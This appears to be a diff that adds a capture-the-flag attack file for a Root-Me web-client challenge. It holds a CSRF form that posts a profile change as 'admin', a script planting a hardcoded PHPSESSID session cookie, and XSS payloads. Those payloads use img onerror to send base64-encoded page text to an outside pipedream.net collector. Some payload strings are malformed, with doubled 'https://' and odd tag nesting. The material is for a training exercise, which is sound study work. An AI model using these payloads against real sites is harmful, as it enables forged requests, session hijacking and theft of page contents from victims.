@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+</head>
+<body>
+    <form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
+        <input type="checkbox" name="status" value="off">
+        <input type="hidden" value="admin" name="username">
+        <input type="submit" value="envoyer">
+    </form>
+
+    <script>
+        document.cookie = "PHPSESSID=7e0aa20a2527ebb3d29b458133ff66f0";
+    </script>
+</body>
+</html>
+
+http://challenge01.root-me.org:58008/report?url=%3Cimg%20src%3Dx%20onerror%3D%22location%3D//https://https://eomrr4kjefzdkon.m.pipedream.net/%3Fx%3D'%2Bbtoa(document.body.innerText)%22%3E
+<img src/onerror=%3Cimg%20src%3Dx%20onerror%3D%22location%3D//https://https://eomrr4kjefzdkon.m.pipedream.net/%3Fx%3D'%2Bbtoa(document.body.innerText)%22%3E>
